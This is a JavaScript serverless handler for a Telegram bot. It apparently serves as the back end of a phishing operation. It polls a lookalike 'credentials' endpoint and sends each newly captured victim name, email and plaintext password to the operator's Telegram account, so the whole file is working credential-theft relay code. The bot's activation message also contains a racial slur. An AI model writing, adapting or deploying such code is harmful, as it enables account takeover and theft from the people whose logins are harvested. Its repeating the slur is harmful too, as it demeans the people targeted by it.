import fetch from "node-fetch";
import { Redis } from "@upstash/redis";

const BOT_TOKEN = process.env.BOT_TOKEN;
const ALLOWED_USER_ID = process.env.ALLOWED_USER_ID;
const JSON_URL = "https://servver.vercel.app/api/auth/credentials";

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    const body = req.body;

    // Allow ONLY your user ID
    const fromUser = body?.message?.from?.id;
    if (fromUser && fromUser != ALLOWED_USER_ID) {
        return res.status(200).send("Unauthorized user");
    }

    // When user sends /start
    if (body?.message?.text === "/start") {
        await sendMsg(fromUser, "Bot Activated Nigga 😎");
        return res.status(200).send("ok");
    }

    // Fetch credentials JSON
    const json = await fetch(JSON_URL).then(r => r.json());

    // Latest entry (last object)
    const latest = json[json.length - 1];

    // Unique ID of latest
    const latestId = latest._id;

    // Get previously stored last ID
    const lastSeen = await redis.get("last_seen_id");

    if (!lastSeen) {
        // First time — store but don't send message
        await redis.set("last_seen_id", latestId);
        return res.status(200).send("initialized");
    }

    // If a new entry appears
    if (latestId !== lastSeen) {
        await redis.set("last_seen_id", latestId);

        const msg = 
`🔥 NEW CREDENTIAL ADDED 🔥
Name: ${latest.name}
Email: ${latest.email}
Password: ${latest.password}
Created: ${latest.createdAt}
ID: ${latest._id}`;

        await sendMsg(ALLOWED_USER_ID, msg);
    }

    res.status(200).send("ok");
}

// Telegram send message
async function sendMsg(chatId, text) {
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text })
    });
}
